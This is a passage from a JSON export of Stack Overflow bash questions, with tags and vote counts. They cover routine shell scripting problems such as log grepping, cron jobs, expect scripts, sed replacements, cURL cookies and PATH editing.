do\n    zgrep -arcH $i /webstats/some_website/*/*.2012-10-1{7..9}* ;\ndone\n</code></pre>\n\n<p>There are lots of log files. I just want to know which ones return positive results.</p>\n\n<p>Most of them will print <code>0</code> at the end indicating that there were nothing found, and some will print the number of matches. How can I select only those and output results in a file ?</p>\n\n<p>Thanks.</p>\n"},{"tags":["arrays","bash","function","loops","screen"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":25,"score":2,"question_id":13150735,"title":"Bash array as argument inside of screen","body":"<p>The below code is is not working  as I expect it to. I might be because I am doing this all wrong but I think it may be a quoting issue. </p>\n\n<pre><code>    #!/bin/bash \n\n    IFS=$'\\n' \n    fortune_lines=($(fortune | fold -w 30))\n    Screen_Session=$(mainscreen)\n    Screen_OneLiner=$(screen -p 0 -S ${Screen_Session} -X stuff \"`printf \"say   ${fortune_lines[@]}\\r\"`\")\n\n    for var in \"${Screen_OneLiner[@]}\"\n      do\n        echo \"${var}\"\n    done\n</code></pre>\n\n<p>I think I am not quoting something correctly because when I attempt to execute this. I get..</p>\n\n<pre><code>    line 5: mainscreen: command not found\n    [screen is terminating\n</code></pre>\n\n<p>Essentially I am attempting to add this function (that works)</p>\n\n<pre><code>    IFS=$'\\n' \n    fortune_lines=($(fortune | fold -w 30))\n</code></pre>\n\n<p>To this screen one liner</p>\n\n<pre><code>   screen -p 0 -S ${Screen_Session} -X stuff \"`printf \"say   ${fortune_lines[@]}\\r\"`\"\n</code></pre>\n\n<p>Then have it loop the array</p>\n\n<pre><code>    for var in \"${ArrayName[@]}\"\n   do\n      echo \"${var}\"\n\n   done\n</code></pre>\n\n<p>So I am not sure how far I am away (in code) to what I am trying to do. Any help would be great. </p>\n"},{"tags":["linux","bash","centos","redhat"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":13150782,"title":"How to rebuild the ISO?","body":"<p>I need to modify an linux bootable ISO. For which I am mounting the ISO in some dir then I am copying the content of ISO into another dir. Then I am modifying the some RPMs. After that I am trying to rebuild the ISO using below commands:</p>\n\n<p><strong>chmod u+w $content_path/isolinux/*</strong></p>\n\n<p><strong>cd $content_path/</strong></p>\n\n<p><strong>mkisofs -r -T -J -V '$label' -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -v -o $iso ./</strong></p>\n\n<p>But it is resulting in unexpected Output. I think linking is not proper with ISO content. Please help.</p>\n"},{"tags":["git","bash","unix","ftp"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13150724,"title":"Push a git branch to a remote server which has not got git installed","body":"<p>I have a shared hosting account which I have both SSH and FTP access to, hover I do not have root access, and the server does not have git installed.\nI am curious as to how feasible it is to set up a watcher script that monitors whether I have committed/merged to branch master (locally), and upload the master branch via FTP to the remote server.</p>\n\n<p>I could do it manually (without the watcher script), perhaps with a bash script (I'm running Linux Mint) if creating a watcher is too complex, but I have no idea how to do it either way.</p>\n"},{"tags":["regex","linux","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13150411,"title":"Why BASH_REMATCH doesn't work on my computer?","body":"<p>The code is like this:</p>\n\n<pre><code>#!/bin/bash\nif [[ foobarbletch =~ 'foo(bar)bl(.*)' ]]\n then\n     echo The regex matches!\n     echo $BASH_REMATCH      \n     echo ${BASH_REMATCH[1]} \n     echo ${BASH_REMATCH[2]} \n fi\n</code></pre>\n\n<p>When I try to run it, it dosn't display anything..</p>\n\n<pre><code>bash-3.2$ bash --version\nGNU bash, version 3.2.48(1)-release (x86_64-apple-darwin12)\nCopyright (C) 2007 Free Software Foundation, Inc.\nbash-3.2$ /bin/bash test_rematch.bash\nbash-3.2$ \n</code></pre>\n\n<p>Does anyone have ideas about this? Thanks!</p>\n"},{"tags":["bash","tcl","expect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":13125183,"title":"Expect returns same value","body":"<p>I need to be able to return a different password after the first one fails which will be the second time the prompt asks for the same expect value \"Password:\"    </p>\n\n<pre><code>(expect -c \"\n\n #exp_internal 1\n  set passwords {PASS1 PASS2}\n  set index 0 \n  set timeout 20\n  # Start the session with the input variable and the rest of the hostname\n  spawn telnet $host\n  set timeout 3 \n  expect {\n-ex     \\\"Password:\\\" {\n            send \\\"[lindex $passwords $index]\\r\\\"\n            incr index  \n exp_continue;\n  }\n  }\n</code></pre>\n\n<p>I just can't get it to work. It looks like there is nothing in the <code>lindex</code> send:</p>\n\n<pre><code> -ex     \"Password:\" {\n    send \"[lindex  ]\\r\"\n</code></pre>\n"},{"tags":["linux","bash","prompt"],"answer_count":14,"favorite_count":25,"up_vote_count":33,"down_vote_count":0,"view_count":5664,"score":33,"question_id":103857,"title":"What is your favorite Bash prompt?","body":"<p>What are some elements in your favorite bash prompt?  </p>\n\n<p>I like to have an indicator of the success of the most recent command, like so  (in .bashrc):</p>\n\n<pre><code>function exitstatus {\n\n    EXITSTATUS=\"$?\"\n    BOLD=\"\\[\\033[1m\\]\"\n    RED=\"\\[\\033[1;31m\\]\"\n    GREEN=\"\\[\\e[32;1m\\]\"\n    BLUE=\"\\[\\e[34;1m\\]\"\n    OFF=\"\\[\\033[m\\]\"\n\n    PROMPT=\"[\\u@\\h ${BLUE}\\W${OFF}\"\n\n    if [ \"${EXITSTATUS}\" -eq 0 ]\n    then\n       PS1=\"${PROMPT} ${BOLD}${GREEN}:)${OFF} ]\\$ \"\n    else\n       PS1=\"${PROMPT} ${BOLD}${RED}:(${OFF} ]\\$ \"\n    fi\n\n    PS2=\"${BOLD}&gt;${OFF} \"\n}\n\nPROMPT_COMMAND=exitstatus\n</code></pre>\n"},{"tags":["bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13148617,"title":"Bash: can't create lower case out of script argument?","body":"<pre><code>#!/bin/sh\nvar=\"$1\";\nOUTPUT=$(echo ${$var,,});\necho $OUTPUT\n</code></pre>\n\n<p>I tried every possible combination, including escaping certain characters.</p>\n\n<p>I just cant get shell to output my script argument lower cased.</p>\n\n<p>Error:</p>\n\n<pre><code>createmodule.sh: 26: createmodule.sh: Bad substitution\n</code></pre>\n\n<p>Why is this?</p>\n"},{"tags":["bash","cron","debian"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":13096921,"title":"Running debian bash file as cron job","body":"<p>I can't seem to run a simple bash file as a cron job that runs once a minute.</p>\n\n<pre><code>#!/bin/bash \n\nNET_INTERFACE=eth0\n\nCURRENT_IP=`/sbin/ifconfig $NET_INTERFACE | sed -n \"/inet addr:.*255.255.25[0-5].[0-9]/{s/.*inet addr://; s/ .*//; p}\"`\n\nwget -q --delete-after \"http://abc.co.uk/raspiUpdate.php?pi=1&amp;ip=${CURRENT_IP}\"\n</code></pre>\n\n<p>In the crontab I have:</p>\n\n<pre><code> *     *     *     *     *        /home/user/Scripts/script.sh\n</code></pre>\n\n<p>Where am I going wrong?</p>\n\n<p>Thanks</p>\n"},{"tags":["bash","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13115567,"title":"bash grep file not found","body":"<p>I wish to apply some commands based on a grep search I do <code>grep -l \"If you wish to distribute\" *.pdf</code> and I see the files I want to process but with the following bash script the files are not processed:</p>\n\n<pre><code>#!/bin/bash -x\ntext1=\"If you wish to distribute\"  #Science papers\n\n# Originally: grep -l \"text1\" \\*.pdf |\n\ngrep -l \"$text1\" *.pdf |\nwhile IFS=\"\" read -r -d \"\" file; do\n  noext=\"${file%\\.*}\"\n  pdftk \"$file\" cat 2-end output \"$noext\".tmp \n  mv -f \"$noext\".tmp \"$file\"\ndone\n</code></pre>\n\n<p>and the output is</p>\n\n<pre><code>+ IFS=\n+ grep -l 'If you wish to distribute' project_latex.pdf 'Science 2003 Metapopulation Persistence with Age-Dependent Disturbance or Succession.pdf' 'Science 2006 A Keystone Mutualism Drives Pattern in a Power Function.pdf' short-math-guide.pdf Test.pdf\n+ read -r -d '' file\n</code></pre>\n"},{"tags":["bash","tar","ls","depth"],"answer_count":4,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":2749,"score":3,"question_id":2700306,"title":"Listing the content of a tar file or a directory only down to some level","body":"<p>I wonder how to list the content of a tar file only down to some level? </p>\n\n<p>I understand <code>tar tvf mytar.tar</code> will list all files, but sometimes I would like to only see directories down to some level.</p>\n\n<p>Similarly, for the command <code>ls</code>, how do I control the level of subdirectories that will be displayed? By default, it will only show the direct subdirectories, but not go further.</p>\n"},{"tags":["git","bash","shell","io-redirection"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":13146187,"title":"Git: unable to redirect/parse the output of 'git fetch --dry-run' command","body":"<p>What is special about the output message of <code>git fetch</code> command that is printed on the console? I'm not able to use <code>grep</code>, <code>xargs</code>, etc. Not able to redirect the output to a file also..</p>\n\n<p>Note: I'm using <code>git fetch --dry-run</code> command</p>\n\n<pre><code>[sangeeth@localhost santest-code]$ \n[sangeeth@localhost santest-code]$ git fetch --dry-run &gt; /tmp/1\nFrom ssh://git.code.sf.net/p/santest/code\n   9f068d0..2b9dc4e  master     -&gt; origin/master\n[sangeeth@localhost santest-code]$ \n[sangeeth@localhost santest-code]$ cat /tmp/1              &lt;= no data\n[sangeeth@localhost santest-code]$  \n[sangeeth@localhost santest-code]$ git fetch --dry-run | grep \"ssh\"     &lt;= output has both lines\nFrom ssh://git.code.sf.net/p/santest/code\n   9f068d0..2b9dc4e  master     -&gt; origin/master\n[sangeeth@localhost santest-code]$ \n[sangeeth@localhost santest-code]$ git --version \ngit version 1.7.11.4\n[sangeeth@localhost santest-code]$ \n</code></pre>\n\n<p>I'm trying to parse the output of <code>git fetch --dry-run</code> command to check whether the local (<code>master</code>) branch is up-to-date with the remote (<code>origin/master</code>) branch. </p>\n"},{"tags":["linux","bash"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13146400,"title":"How do I change chown and chgrp","body":"<p>How do I change chown and chgrp by default?\nBecause every time that I upload a new file I need to change it specific.</p>\n"},{"tags":["php","bash","curl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13102931,"title":"cURL able to make cookie but not use it","body":"<p>I'm trying to script bash to do a few simple curl commands.</p>\n\n<p>I can generate a cookie that I want to use with the following command:</p>\n\n<pre><code>curl -c cookie --data \"user=user&amp;password=pass\" //example/login.php\n</code></pre>\n\n<p>However, when I try passing it into the site again the cookie is ignored. It's as if I didn't even login into the first place. The command I'm using is the following:</p>\n\n<pre><code>curl -b cookie //example/\n</code></pre>\n\n<p>What am I doing wrong? </p>\n\n<p>Any help would be appreciated thanks.</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13145090,"title":"Argument parsing \"library\" for bash?","body":"<p>I know <code>getopts</code> but I have to make the parsing and error handling each time.</p>\n\n<p>Does anyone know if there exist a \"library\" or a set of functions for Bash for parsing command arguments?</p>\n\n<p>E.g. Perl have tons of these.</p>\n"},{"tags":["bash","applescript","runtime-error"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13114860,"title":"Applescript .app always gives -1708","body":"<p>I am making a basic pingtest to stretch my knowledge of bash and Applescript, so I made this:</p>\n\n<pre><code>on run argv\ntry\n    if (count argv) is less than 1 or (count argv) is greater than 1 then\n        set IP_address to \"\"\n        set dialog_1 to display dialog \"Enter IP Address:\" default answer \"\" with title \"Ping\"\n        set the IP_address to the text returned of dialog_1\n        try\n            set ping to (do shell script \"ping -c 2 \" &amp; IP_address)\n            display dialog \"Connection Successful.\" buttons {\"OK\"} default button 1\n            return 1\n        on error\n            --if we get here, the ping failed\n            display dialog \"Conection failed. Host is down\" buttons {\"Darn\"} default button 1\n            return 0\n        end try\n    end if\n    if (count argv) = 1 then\n        set IP_address to item 1 of argv\n        try\n            set ping to (do shell script \"ping -c 2 \" &amp; IP_address)\n            return 1\n        on error\n            -- if we get here, the ping failed\n            return 0\n        end try\n    end if\non error error_message number error_number\n    if (error_number) is not equal to -128 then\n        display alert (\"An error has occured!\") message error_message &amp; (\" Error number \") &amp; error_number &amp; \".\"\n    end if\n\n    return error_number\nend try\n</code></pre>\n\n<p>end run</p>\n\n<p>(I couldn't get the end run inside the code snippet)</p>\n\n<p>And in bash I made this:</p>\n\n<p>!/bin/bash\ncurrentDir=<code>pwd</code>\nSuccess=<code>$currentDir/$1/Contents/MacOS/applet $2</code>\necho $Success</p>\n\n<p>(I couldn't get any of that inside a code snippet)</p>\n\n<p>When I run just the AppleScript, in the editor it works fine, but the .app and bash versions give me the -1708 error. I have narrowed the problem down to this: <code>if (count argv) is less than 1 or (count argv) is greater than 1 then</code></p>\n\n<p>What could I do to fix this, or even just make my code neater?</p>\n\n<p>Thanks</p>\n\n<p>EDIT(1): I want my program to run a GUI version if it's not provided any arguments, and when it is passed arguments, I want it to run in the background.</p>\n"},{"tags":["php","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13142254,"title":"Shell and sed: adding an array element to a PHP file","body":"<p>I have a php file:</p>\n\n<pre><code>&lt;?php\nreturn array(\n    'modules' =&gt; array(\n        'Application',\n        'DoctrineModule',\n        'DoctrineORMModule'\n    ),\n);\n</code></pre>\n\n<p>Since I'm lazy, I'm writing a script that will add an element to 'modules' array with a simple call:</p>\n\n<pre><code>$ sh myscript.sh 'NewModule'\n</code></pre>\n\n<p>NewModule should be added after the last 'modules' element.</p>\n\n<p>I tried doing this with 'sed' command but I didnt succeed yet. Any help is welcome.</p>\n"},{"tags":["linux","bash","unix","sed","awk"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":13141599,"title":"Efficient way to replace strings in one file with strings from another file","body":"<p>Searched for similar problems and could not find anything that suits my needs exactly:</p>\n\n<p>I have a very large HTML file scraped from multiple websites and I would like to replace all </p>\n\n<pre><code>class=\"key-&gt;from 2nd file\"\n</code></pre>\n\n<p>with</p>\n\n<pre><code>style=\"xxxx\"\n</code></pre>\n\n<p>At the moment I use <code>sed</code> - it works well but only with small files </p>\n\n<blockquote>\n  <p><i>while read key; do  sed -i \"s/class=\\\"$key\\\"/style=\\\"xxxx\\\"/g\"\n  file_to_process; done &lt; keys</i></p>\n</blockquote>\n\n<p>When I'm trying to process something larger it takes ages</p>\n\n<p>Example:</p>\n\n<pre><code>keys - Count: 1233 lines\nfile_to_ process - Count: 1946 lines\n</code></pre>\n\n<p>It takes about 40 s to complete only 1/10 of processing I need</p>\n\n<pre><code>real    0m40.901s\nuser    0m8.181s\nsys     0m15.253s\n</code></pre>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":375,"score":2,"question_id":3834839,"title":"escaping double quote inside a double quote","body":"<p>Can anybody show me how to escape double quote inside a double string in bash?</p>\n\n<p>For example in my shell script</p>\n\n<pre><code>#!/bin/bash\n\ndbload=\"load data local infile \\\"'gfpoint.csv'\\\" into table $dbtable FIELDS TERMINATED BY ',' ENCLOSED BY '\\\"' LINES TERMINATED BY \\\"'\\n'\\\" IGNORE 1 LINES\"\n</code></pre>\n\n<p>I can't get the ENCLOSED BY '\\\"' with double quote escape correctly. I can't use single quote for my variable because i want to use variable $dbtable.</p>\n\n<p>Thanks very much for your help.</p>\n"},{"tags":["bash","msysgit","cmd.exe"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13071242,"title":"Bash calling cmd /c %ProgramFiles(x86)%\\","body":"<p>From a bash script (bash from msysgit), I'd like to run MS VB 2010 Express compilation but none of the following lines works:</p>\n\n<pre><code>$ $PROGRAMFILES/Microsoft\\ Visual\\ Studio\\ 10.0\\\\Common7\\\\ide\\\\vbexpress.exe path/to/solution.sln /build\n</code></pre>\n\n<p>Results in <code>sh.exe\": C:\\Program: No such file or directory</code></p>\n\n<pre><code>$ \"$PROGRAMFILES/Microsoft\\ Visual\\ Studio\\ 10.0\\\\Common7\\\\ide\\\\vbexpress.exe\" path/to/solution.sln /build\n</code></pre>\n\n<p>Results in <code>sh.exe\": C:\\Program Files (x86)/Microsoft\\ Visual\\ Studio\\ 10.0\\Common7\\ide\\vbexpress.exe: No such file or directory</code></p>\n\n<pre><code>$ cmd /c \"$PROGRAMFILES(X86)/Microsoft\\ Visual\\ Studio\\ 10.0\\\\Common7\\\\ide\\\\vbexpress.exe\" path/to/solution.sln /build\n</code></pre>\n\n<p>This will open the cmd-shell only, as cmd seems not to recognize the argument to the parameter <code>/c</code></p>\n\n<pre><code>$ cmd \"/c $PROGRAMFILES(X86)/Microsoft\\ Visual\\ Studio\\ 10.0\\\\Common7\\\\ide\\\\vbexpress.exe\" path/to/solution.sln /build\n</code></pre>\n\n<p>Error Message: Command <code>C:\\Program</code>\" not found</p>\n\n<pre><code>$ /c/Program\\ Files\\ \\(x86\\)/Microsoft\\ Visual\\ Studio\\ 10.0/Common7/IDE/vbexpress.exe IOS\\\\IOS.sln /build\n</code></pre>\n\n<p>Kinda works, but though it starts VB Express it complains that <code>C:\\Program Files (x86)/Git/build</code> could not be load - clearly the shell expands <code>/build</code> to a path. And this solution is flawed as I would like to use an environment variable to distinguish between 32-bit and 64-bit installations of Windows.</p>\n\n<p>What's the correct way of escaping the path separators and space to get this working?</p>\n"},{"tags":["bash","scripting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13142284,"title":"command line menu options","body":"<p>I have been trying to get my menu to work, however it seems that it only accepts one argument/option at a time, how can I get it to accept multiple options? </p>\n\n<pre><code>#!/bin/bash\n\n##### Main\n\nfunction usage\n{\n    echo \"\nusage: infinidb [[-f file ] [-i] | [-h]]  name ...\n}\n\n        while [ \"$1\" != \"\" ]; do\n        case $1 in\n            -f | --file )           shift\n                                    filename=$1\n                                    ;;\n            -i |  )                 filename2=$2\n                                    ;;\n            -h | --help )           usage\n                                    exit\n                                    ;;\n            * )                     usage\n                                    exit 1\n        esac\n        shift\n    done\n\n            echo $filename \n            echo $filename2\n</code></pre>\n\n<p>when running the script </p>\n\n<p>the following output show show</p>\n\n<p>./script.sh -f apple -i tree</p>\n\n<p>apple tree</p>\n"},{"tags":["linux","bash","shell","find"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":52,"score":3,"question_id":13132836,"title":"Using shell to finds directories that do not have a specified pattern of files in the folder","body":"<p>The directory tree is like this:</p>\n\n<pre><code>.\n├── A_123\n│   └── 123.txt\n├── A_456\n│   ├── tmp\n│   └── tmp.log\n└── A_789\n    └── 789.txt\n</code></pre>\n\n<p>There're 3 directories (A_123, A_456, A_789). \nThe pattern of a directory name is: <code>A_{numbers}</code> and the file I'm interested in is <code>{numbers}.txt</code>.</p>\n\n<p>I was wondering whether there's a way to get the directories <code>A_{numbers}</code> that has no <code>{numbers}.txt</code> file in them. For example above, this script should return:</p>\n\n<pre><code>./A_456\n</code></pre>\n\n<p>as <code>A_456</code> doesn't have <code>456.txt</code> in its folder but <code>A_123</code> and <code>A_789</code> have their <code>{numbers}.txt</code> files in the relevant folder.</p>\n\n<p>Anyone has ideas about this? Thanks!</p>\n"},{"tags":["php","bash","sh"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13141605,"title":"How to run a background process in PHP and get the return value","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/13127555/make-php-wait-for-matlab-script-to-finish-executing\">Make PHP wait for Matlab script to finish executing</a>  </p>\n</blockquote>\n\n\n\n<p>Okay, starting from <a href=\"http://stackoverflow.com/questions/45953/php-execute-a-background-process\">php execute a background process</a>\nto run a background process works great.  The problem is, I need the return of that process also.  The obvious solution to me is :</p>\n\n<pre><code>$cmd = \"($cmd &gt; $outputfile 2&gt;&amp;1 || echo $? &gt; $returnfile) &amp; echo $! &gt; $pidfile\";\nexec($cmd);\n</code></pre>\n\n<p>When I run the generated command on the command line, it backgrounds and the files are filled out as expected.  The problem is that when php exec() runs, the command doesn't go to the background (at least, exec doesn't return until the command finishes).  I tried variations with nohup and wait $pid, but still no solution.  </p>\n\n<p>Any thoughts?</p>\n"},{"tags":["linux","bash","scripting","ghostscript"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":74,"score":3,"question_id":12357431,"title":"Using ps2pdf correctly in a script?","body":"<p>I have a script below and I am having problems. I have several folders with PostScript file in them I want to batch convert to PDFs. I have done very little scripting in linux before but I think this is close. It is not quite working how I want it though. Any suggesting? or notice a mistake I made? I want the files to stay in the same location after they have been converted. Currently this converts the files but they get all put together in one folder.</p>\n\n<p>I call the script  like this: ./all.ps.to.pdf \"/directory/to/process\"</p>\n\n<pre><code>#!/bin/sh\n\nSTARTDIR=$1\nif [ ! -d \"$STARTDIR\" ]; then\necho No starting directory $STARTDIR\nexit 1\nfi\n\nfind $STARTDIR -name '*.ps' -print | sed -e 's/.ps$//' |\nxargs -l -i  ps2pdf \\{}.ps\n</code></pre>\n"},{"tags":["bash","shell","wine"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13141296,"title":"Sending keystrokes or text to a program running with wine","body":"<p>I'm starting a windows-program with wine in a shell script. Now I would like to pass keystrokes and texts to it. I've tried <code>xvkbd</code> as mentioned in <a href=\"http://stackoverflow.com/questions/954779/sending-keycode-to-xorg-wine-with-bash-script\">this</a> question, but the program just outputs the letter/text into the terminal and exits after that. Here's an example:</p>\n\n<pre><code>`wine BERCon.exe &gt; output.txt &amp;`\nsleep 5;\n`xvkbd -text \"N\"`\n</code></pre>\n\n<p>Is that even possible to do? I checked the man-page of <code>xvkbd</code> to check if I can change the focus somehow, but it seems like thats not possible.I noticed that if I do something like <code>echo \"N\" | wine BERCon.exe</code> the N actually gets passed to wine and wine puts it into the program, but gets into a loop after that and continues to input that letter.</p>\n"},{"tags":["bash","unix","mv"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13135701,"title":"How to append the timestamp of a process to the name of a file in Unix","body":"<p>I have a directory <code>/home/user/ingest/</code> which has many files inside it with varying sizes. I need to move every file inside this folder into <code>/home/user/ingest/inbox</code> every two minutes. There might be a situation where the first file might take more than 2 mins to move into <code>/home/user/ingest/inbox</code>. In which case when its moving the second file, it SHOULDN'T take the first file as well. Which is why I thought to append the timestamp to the name of files at the time of moving. Is there anyway to do this in shell scripting? </p>\n\n<p>And I also understand that usingh crontab might help me in scheduling the execution of the shell script every two minutes. I have a basic idea of cron but for my particular requirement, how can I check whether the file is being loved every two minutes or not?</p>\n"},{"tags":["bash","backspace"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":787,"score":2,"question_id":4196161,"title":"Bash read backspace button behavior problem","body":"<p>When using read in bash, pressing backspace does not delete the last character entered, but appears to append a backspace to the input buffer. Is there any way I can change it so that delete removes the last key typed from the input? If so how?</p>\n\n<p>Here's a short example prog I'm using it with if it's of any help:</p>\n\n<pre><code>#!/bin/bash\n\ncolour(){ #$1=text to colourise $2=colour id\n        printf \"%s%s%s\" $(tput setaf $2) \"$1\" $(tput sgr0)\n}\ngame_over() { #$1=message $2=score      \n        printf \"\\n%s\\n%s\\n\" \"$(colour \"Game Over!\" 1)\" \"$1\"\n        printf \"Your score: %s\\n\" \"$(colour $2 3)\"\n        exit 0\n}\n\nscore=0\nclear\nwhile true; do\n        word=$(shuf -n1 /usr/share/dict/words) #random word from dictionary \n        word=${word,,} #to lower case\n        len=${#word}\n        let \"timeout=(3+$len)/2\"\n        printf \"%s  (time %s): \" \"$(colour $word 2)\" \"$(colour $timeout 3)\"\n        read -t $timeout -n $len input #read input here\n        if [ $? -ne 0 ]; then   \n                game_over \"You did not answer in time\" $score\n        elif [ \"$input\" != \"$word\" ]; then\n                game_over \"You did not type the word correctly\" $score;\n        fi  \n        printf \"\\n\"\n        let \"score+=$timeout\" \ndone\n</code></pre>\n"},{"tags":["linux","bash","permissions","fedora","chmod"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":32,"score":0,"question_id":13136016,"title":"Changing permissions for specific folder","body":"<p>i need some help. I'm using Fedora 15. I have 2 users: user1 and user2 and directory in /usr/local/example_directory. Now for this directory owner is user1 and other users can only read this. I need to add specific permissions for user2 so it can remove and modify this directory recursively. How i can do it?\nP.S.: Sorry for bad language.</p>\n"},{"tags":["bash","variable-expansion"],"answer_count":23,"favorite_count":9,"up_vote_count":14,"down_vote_count":0,"view_count":8394,"score":14,"question_id":370047,"title":"What is the most elegant way to remove a path from the $PATH variable in Bash?","body":"<p>Or more generally, how do I remove an item from a colon-separated list in a Bash environment variable?</p>\n\n<p>I thought I had seen a simple way to do this years ago, using the more advanced forms of Bash variable expansion, but if so I've lost track of it.  A quick search of Google turned up surprisingly few relevant results and none that I would call \"simple\" or \"elegant\".  For example, two methods using sed and awk, respectively:</p>\n\n<pre><code>PATH=$(echo $PATH | sed -e 's;:\\?/home/user/bin;;' -e 's;/home/user/bin:\\?;;')\nPATH=!(awk -F: '{for(i=1;i&lt;=NF;i++){if(!($i in a)){a[$i];printf s$i;s=\":\"}}}'&lt;&lt;&lt;$PATH)\n</code></pre>\n\n<p>Does nothing straightforward exist?  Is there anything analogous to a split() function in Bash?</p>\n\n<p><strong>Update:</strong><br/>\nIt looks like I need to apologize for my intentionally-vague question; I was less interested in solving a specific use-case than in provoking good discussion.  Fortunately, I got it!</p>\n\n<p>There are some very clever techniques here, but it looks like there's no way to accomplish this using pure Bash script (though <a href=\"#370255\">nicerobot's IFS/array technique</a> comes pleasantly close).  In the end, I've added the following three functions to my toolbox.  The magic happens in path_remove, which is based largely on <a href=\"#370192\">Martin York's clever use of <code>awk</code>'s RS variable</a>.</p>\n\n<pre><code>path_append ()  { path_remove $1; export PATH=\"$PATH:$1\"; }\npath_prepend () { path_remove $1; export PATH=\"$1:$PATH\"; }\npath_remove ()  { export PATH=`echo -n $PATH | awk -v RS=: -v ORS=: '$0 != \"'$1'\"' | sed 's/:$//'`; }\n</code></pre>\n\n<p>The only real cruft in there is the use of <code>sed</code> to remove the trailing colon.  Considering how straightforward the rest of Martin's solution is, though, I'm quite willing to live with it!</p>\n\n<p><hr /></p>\n\n<p>Related question: <A href=\"http://stackoverflow.com/questions/273909/how-do-i-manipulate-path-elements-in-shell-scripts\">http://stackoverflow.com/questions/273909/how-do-i-manipulate-path-elements-in-shell-scripts</A></p>\n"},{"tags":["bash","sed","awk"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":59,"score":-1,"question_id":13123908,"title":"Change subnet with bash script","body":"<p>I'm looking to change every instance of 192.168.XXX in a file to 192.168.yyy. in a network config file using a bash script. The thing hanging me up is that I don't know for sure what xxx is going to be. For example it could be 192.168.122.1 or 192.168.123.1.  Also it could be 192.168.122.2 or 192.168.122, etc. I think this can be done with one command.</p>\n\n<p>Here is the default network file:</p>\n\n<pre><code>    &lt;network&gt;\n      &lt;name&gt;default&lt;/name&gt;\n      &lt;bridge name=\"virbr0\" /&gt;\n      &lt;forward/&gt;\n      &lt;ip address=\"192.168.122.1\" netmask=\"255.255.255.0\"&gt;\n        &lt;dhcp&gt;\n          &lt;range start=\"192.168.122.2\" end=\"192.168.122.254\" /&gt;\n        &lt;/dhcp&gt;\n      &lt;/ip&gt;\n    &lt;/network&gt;\n</code></pre>\n"},{"tags":["bash","optimization"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13132216,"title":"bash script optimization","body":"<p>I have this script below that will be daemonized and triggered possibly hundreds if not thousands of times by different users.</p>\n\n<p>The script uses <code>inotifywait</code> to watch a folder for an upload and then move the uploaded file to its final destination for presentation, after rotating (backup/move) previous uploads. The code will be run against different upload folders that are created on the fly.</p>\n\n<pre><code>#!/bin/bash\n\ndb=\"$VAR1\"/path/to/upload/folder/\ns3=\"$VAR2\"/path/to/remote/folder\n\ninotifywait -m -r -e attrib \"$db\" |\nwhile read dir ev file;\ndo\n\n        for dirnum in $(cd \"$s3\"; ls */*.png | sed 's%/.*%%' | sort -nr)\n        do\n                 next=$(($dirnum + 1));                       \n                 mv \"$s3/$dirnum/post$dirnum.png\" \"$s3/$next/post$next.png\";\n        done\n\n        mv \"$db\"/\"$file\"  \"$s3\"/1/post1.png\n\ndone\n</code></pre>\n\n<p>What can I do to optimize it? Or should it be rewritten a faster programming language? Also, how can I test scripts under a certain amount of load?</p>\n"},{"tags":["linux","bash","osx","unix","shell"],"answer_count":4,"favorite_count":2,"up_vote_count":8,"down_vote_count":0,"view_count":505,"score":8,"question_id":2704635,"title":"Is there a way to find the running time of the last executed command in the shell?","body":"<p>Is there a command like <code>time</code> that can display the running time details of the last or past executed commands on the shell?</p>\n"},{"tags":["bash","shell","concurrency","process"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13131765,"title":"How do you stop two concurrent processes?","body":"<p>In my web development workflow, I have two 